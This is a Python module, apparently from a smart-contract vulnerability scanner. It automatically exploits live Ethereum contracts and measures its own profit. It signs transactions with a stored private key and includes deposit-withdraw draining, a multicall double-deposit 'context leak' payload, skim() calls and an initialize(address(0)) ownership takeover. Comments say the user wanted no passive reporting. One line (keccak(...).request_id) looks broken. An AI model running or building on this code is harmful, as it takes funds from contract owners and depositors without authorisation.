import logging
import time
from typing import Dict, Any, Optional, Tuple
from web3 import Web3
from web3.middleware import geth_poa_middleware
from eth_account import Account
from scanner.config import (
    AUTO_EXPLOIT,
    PRIVATE_KEY,
    MY_WALLET_ADDRESS,
    MAX_BET_SIZE_WEI,
    MAX_FEE_PER_GAS,
    MAX_PRIORITY_FEE,
    RPC_HTTP
)

from scanner.simulation import run_honeypot_simulation_eth

logger = logging.getLogger(__name__)

# Safety cap for the "minimal deposit" requested by user
# 0.0001 ETH or configured max, whichever is smaller
SAFE_DEPOSIT_AMOUNT = min(int(0.0001 * 10**18), MAX_BET_SIZE_WEI)

def execute_cautious_exploit(
    w3: Web3, 
    contract_address: str, 
    bug_type: str, 
    details: Optional[Dict[str, Any]] = None
) -> None:
    """
    Execute a cautious live exploit:
    1. Minimal Deposit (SAFE_DEPOSIT_AMOUNT)
    2. Immediate Withdraw (All)
    
    Args:
        w3: Web3 instance
        contract_address: Target contract
        bug_type: Type of bug found
        details: Additional bug details
    """
    if not AUTO_EXPLOIT:
        logger.info("[EXPLOIT] Auto-exploit is disabled in config (AUTO_EXPLOIT=False).")
        return
    if not PRIVATE_KEY:
        logger.info("[EXPLOIT] No private key found in config. Cannot execute.")
        return

    try:
        account = Account.from_key(PRIVATE_KEY)
        my_address = account.address
        nonce = w3.eth.get_transaction_count(my_address)
        
        # --- PROFIT TRACKING START ---
        start_balance = w3.eth.get_balance(my_address)
        # -----------------------------

        print(f"[EXPLOIT] Preparing cautious exploit for {contract_address} ({bug_type})...", flush=True)
        
        last_tx_hash = None

        # 1. Determine Payload based on bug type
        # Default strategy: Deposit -> Withdraw
        
        # Common Selectors
        # deposit() -> d0e30db0
        # deposit(uint256) -> b6b55f25
        # withdraw() -> 3ccfd60b
        # withdraw(uint256) -> 2e1a7d4d
        # withdrawAll() -> 853828b6
        
        # We will try to construct a "multicall" if supported, or send two transactions.
        # Sending two transactions is risky (atomicity), but for "cautious live exploit" 
        # checking generic bugs, it might be the only way without a custom smart contract.
        
        # However, for Context Leak (multicall), we MUST use multicall in one tx.
        
        if bug_type == "context_leak_multicall":
            # Safety Check for Context Leak
            # We must simulate the specific multicall payload to be sure.
            # For now, to be absolutely safe, we skip unless we implement a specific simulation.
            # OR we can try the generic safety check as a weak proxy, but that's risky.
            # BETTER: Disable for now to protect funds until specialized simulation is ready.
            print(f"[EXPLOIT] Skipping Context Leak for {contract_address} to guarantee safety (Simulation pending).", flush=True)
            return
            # last_tx_hash = _exploit_context_leak(w3, account, contract_address, nonce)
            
        elif bug_type == "sync_loss":
            print(f"[EXPLOIT] Skipping Sync Loss for {contract_address} (Gas saving mode - usually yields dust/tokens, not ETH).", flush=True)
            return
            # last_tx_hash = _exploit_sync_loss(w3, account, contract_address, nonce)
            
        elif bug_type == "ghost_liquidity":
            print(f"[EXPLOIT] Skipping Ghost Liquidity for {contract_address} (Gas saving mode - speculative ownership claim).", flush=True)
            return
            # last_tx_hash = _exploit_ghost_liquidity(w3, account, contract_address, nonce, details)
            
        elif bug_type == "timestamp_dependence":
            # Just do deposit -> withdraw fast
            # If we succeed, it means timestamp check failed or wasn't strict enough
            last_tx_hash = _exploit_generic_deposit_withdraw(w3, account, contract_address, nonce)

        elif bug_type == "vault_rounding_dust":
            print(f"[EXPLOIT] Vault/Inflation vulnerability detected. Attempting generic Deposit->Withdraw to probe path.", flush=True)
            last_tx_hash = _exploit_generic_deposit_withdraw(w3, account, contract_address, nonce)

        elif bug_type == "fot_misaccounting_vault":
            # User requested NO passive reporting.
            # Since we can't exploit FoT without tokens/capital, just return silently.
            return

        else:
            # Generic Fallback: Deposit -> Withdraw
            last_tx_hash = _exploit_generic_deposit_withdraw(w3, account, contract_address, nonce)

        # --- PROFIT CALCULATION ---
        if last_tx_hash:
            print(f"[EXPLOIT] Waiting for confirmation of {last_tx_hash}...", flush=True)
            try:
                w3.eth.wait_for_transaction_receipt(last_tx_hash, timeout=60)
                end_balance = w3.eth.get_balance(my_address)
                profit = end_balance - start_balance
                print(f"[RESULT] Execution Finished. Net Profit: {profit} wei ({w3.from_wei(profit, 'ether')} ETH)", flush=True)
            except Exception as e:
                print(f"[RESULT] Could not fetch final balance/receipt: {e}", flush=True)
        # -----------------------------

    except Exception as e:
        logger.error(f"[EXPLOIT] Failed: {e}")
        print(f"[EXPLOIT] Failed: {e}", flush=True)


def _check_withdrawal_safety(contract_address: str) -> Tuple[bool, Optional[str], int]:
    """
    Run local simulation to verify we can withdraw.
    Returns: (is_safe, method_name, simulated_profit)
    """
    print(f"[SAFETY] Running full Deposit->Withdraw simulation for {contract_address}...", flush=True)
    res = run_honeypot_simulation_eth(contract_address, RPC_HTTP)
    if res.get("safe"):
        method = res.get("method")
        profit = res.get("simulated_profit", 0)
        print(f"[SAFETY] Simulation PASSED. Safe to exploit. Method: {method}, Profit: {profit} wei", flush=True)
        return True, method, profit
    else:
        print(f"[SAFETY] Simulation FAILED. Possible Honeypot or Withdraw Lock. Error: {res.get('error')}", flush=True)
        return False, None, 0


def _exploit_ghost_liquidity(w3: Web3, account, target: str, nonce: int, details: Dict[str, Any]) -> Optional[str]:
    """
    Exploit Ghost Liquidity:
    Call initialize(address(0))
    """
    selector = details.get("selector")
    if not selector:
        return None
        
    print(f"[EXPLOIT] Attempting Ghost Liquidity init on {target}...", flush=True)
    
    # Selector + 32 bytes of zeros
    data = bytes.fromhex(selector[2:]) + (b'\x00' * 32)
    
    return _send_tx(w3, account, target, 0, data, nonce)


def _exploit_context_leak(w3: Web3, account, target: str, nonce: int) -> Optional[str]:
    """
    Exploit Multicall Context Leak:
    Call multicall([deposit(), deposit()]) with msg.value = SAFE_DEPOSIT_AMOUNT
    """
    print(f"[EXPLOIT] Attempting Context Leak (multicall) exploit on {target}...", flush=True)
    
    # 1. Prepare Payload: multicall(bytes[] data)
    # Selector: ac9650d8
    multicall_selector = bytes.fromhex("ac9650d8")
    
    # Inner call: deposit() -> d0e30db0
    deposit_call = bytes.fromhex("d0e30db0")
    
    # We want to send [deposit(), deposit()]
    # ABI Encoding for bytes[]:
    # - Offset to array data (0x20)
    # - Array length (2)
    # - Offset to item 0 (relative to array data start)
    # - Offset to item 1
    # - Item 0 length + data
    # - Item 1 length + data
    
    # Actually, let's just use a simpler approach if we can, or manual construction.
    # Manual construction of bytes[]:
    # Head: 
    #   Offset: 0x20 (32)
    # Body:
    #   Length: 0x02
    #   Offset0: 0x40 (64) - points to after the offsets
    #   Offset1: 0x60 (96) - points to after item0 (length 32+32? no. item0 is length(32)+data(32, padded))
    
    # Item 0:
    #   Length: 4
    #   Data: d0e30db00000... (padded to 32)
    # Item 1:
    #   Length: 4
    #   Data: d0e30db00000... (padded to 32)
    
    # Total structure:
    # 0x00: 0000...20 (Offset to array)
    # 0x20: 0000...02 (Length)
    # 0x40: 0000...40 (Offset to Item 0 from array start (0x20). 0x20 + 0x40 = 0x60 absolute? No. Relative to array start.)
    #       Array start is at 0x20. 
    #       Offsets in array are relative to array start.
    #       Item 0 is at 0x20 + (32*2 for offsets) = 0x20 + 0x40 = 0x60?
    #       Let's stick to standard encoding logic.
    
    from eth_abi import encode
    # signature: multicall(bytes[])
    try:
        # types: ['bytes[]']
        # values: [[deposit_call, deposit_call]]
        payload_data = encode(['bytes[]'], [[deposit_call, deposit_call]])
        data = multicall_selector + payload_data
        
        # 2. Send Multicall Transaction
        # msg.value = SAFE_DEPOSIT_AMOUNT (applied once globally)
        tx_hash = _send_tx(w3, account, target, SAFE_DEPOSIT_AMOUNT, data, nonce)
        
        if not tx_hash:
            print("[EXPLOIT] Context Leak Multicall failed. Aborting withdraw.", flush=True)
            return None
            
        # 3. Withdraw
        # If successful, we should have 2 * SAFE_DEPOSIT_AMOUNT balance
        # We try to withdraw everything.
        print(f"[EXPLOIT] Multicall sent. Attempting withdraw...", flush=True)
        
        withdraw_sig = bytes.fromhex("2e1a7d4d") # withdraw(uint256)
        # We expect 2x balance, so let's try to withdraw 2x
        amount_to_withdraw = SAFE_DEPOSIT_AMOUNT * 2
        amount_padded = hex(amount_to_withdraw)[2:].zfill(64)
        w_data = withdraw_sig + bytes.fromhex(amount_padded)
        
        return _send_tx(w3, account, target, 0, w_data, nonce + 1)
        
    except Exception as e:
        print(f"[EXPLOIT] Context Leak payload construction failed: {e}", flush=True)
        return None



def _exploit_sync_loss(w3: Web3, account, target: str, nonce: int) -> Optional[str]:
    """
    Exploit Sync Loss: Call skim(my_address)
    """
    # skim(address) -> bc25cf77
    # encode 'skim(address)' with my_address
    func_sig = w3.keccak(text="skim(address)").request_id[:4]
    padded_addr = account.address[2:].zfill(64)
    data = func_sig + bytes.fromhex(padded_addr)
    
    return _send_tx(w3, account, target, 0, data, nonce)


def _exploit_generic_deposit_withdraw(w3: Web3, account, target: str, nonce: int) -> Optional[str]:
    """
    Generic Deposit (0.0001 ETH) -> Withdraw (Smart)
    """
    # SAFETY CHECK: Run local simulation first
    is_safe, withdraw_method, simulated_profit = _check_withdrawal_safety(target)
    if not is_safe:
        print(f"[EXPLOIT] Safety check failed for {target}. Aborting to save funds.", flush=True)
        return None

    # PROFIT CHECK: Ensure we make money (or at least don't lose on principal)
    # On L2, gas is cheap, but we should strictly avoid break-even (profit=0) loops.
    if simulated_profit <= 0:
        print(f"[EXPLOIT] Simulation showed NO profit (Balance change: {simulated_profit} wei). Skipping to save gas.", flush=True)
        return None

    # Step 1: Deposit
    print(f"[EXPLOIT] Attempting Generic Deposit {SAFE_DEPOSIT_AMOUNT} wei -> Withdraw...", flush=True)
    
    # 1. Deposit
    # Try 'deposit()' -> d0e30db0
    deposit_sig = bytes.fromhex("d0e30db0") 
    
    print(f"[EXPLOIT] Attempting specific 'deposit()' call...", flush=True)
    tx_hash = _send_tx(w3, account, target, SAFE_DEPOSIT_AMOUNT, deposit_sig, nonce)
    
    # Fallback: If deposit() failed, try Raw ETH Send (receive/fallback)
    if not tx_hash:
        print("[EXPLOIT] Standard 'deposit()' failed or reverted. Attempting Raw ETH send (fallback)...", flush=True)
        tx_hash = _send_tx(w3, account, target, SAFE_DEPOSIT_AMOUNT, b'', nonce)

    if not tx_hash:
        print("[EXPLOIT] Both deposit() and Raw ETH send failed. Aborting.", flush=True)
        return None

    # 2. Withdraw using the method confirmed by simulation
    print(f"[EXPLOIT] Deposit successful. Attempting withdraw using confirmed method: {withdraw_method}...", flush=True)
    
    data = b''
    
    if withdraw_method == "withdraw(uint256)":
        withdraw_sig = bytes.fromhex("2e1a7d4d")
        amount_padded = hex(SAFE_DEPOSIT_AMOUNT)[2:].zfill(64)
        data = withdraw_sig + bytes.fromhex(amount_padded)
        
    elif withdraw_method == "withdraw()":
        data = bytes.fromhex("3ccfd60b")
        
    elif withdraw_method == "withdrawAll()":
        data = bytes.fromhex("853828b6")
        
    elif withdraw_method == "redeem(uint256)":
        # redeem(uint256 assets, address receiver, address owner)
        # Selector: ba087652
        selector = bytes.fromhex("ba087652")
        amount_padded = hex(SAFE_DEPOSIT_AMOUNT)[2:].zfill(64)
        addr_padded = account.address[2:].zfill(64)
        data = selector + bytes.fromhex(amount_padded) + bytes.fromhex(addr_padded) + bytes.fromhex(addr_padded)
        
    else:
        # Default fallback
        print(f"[EXPLOIT] Unknown method '{withdraw_method}', defaulting to withdraw(uint256)", flush=True)
        withdraw_sig = bytes.fromhex("2e1a7d4d")
        amount_padded = hex(SAFE_DEPOSIT_AMOUNT)[2:].zfill(64)
        data = withdraw_sig + bytes.fromhex(amount_padded)
    
    return _send_tx(w3, account, target, 0, data, nonce + 1)


def _send_tx(w3: Web3, account, to: str, value: int, data: bytes, nonce: int) -> Optional[str]:
    """
    Helper to sign and send transaction with safety checks.
    """
    try:
        # 1. Estimate Gas (Simulation)
        gas_est = w3.eth.estimate_gas({
            "from": account.address,
            "to": to,
            "value": value,
            "data": data,
            "nonce": nonce
        })
        
        # Safety Multiplier
        gas_limit = int(gas_est * 1.2)
        
        tx = {
            "from": account.address,
            "to": to,
            "value": value,
            "data": data,
            "nonce": nonce,
            "gas": gas_limit,
            "maxFeePerGas": MAX_FEE_PER_GAS,
            "maxPriorityFeePerGas": MAX_PRIORITY_FEE,
            "chainId": w3.eth.chain_id,
            "type": 2
        }
        
        signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        print(f"[EXPLOIT] Sent TX: {to} | Val: {value} | Hash: {tx_hash.hex()}", flush=True)
        return tx_hash.hex()
        
    except Exception as e:
        print(f"[EXPLOIT] Simulation/Send failed for {to}: {e}", flush=True)
        return None
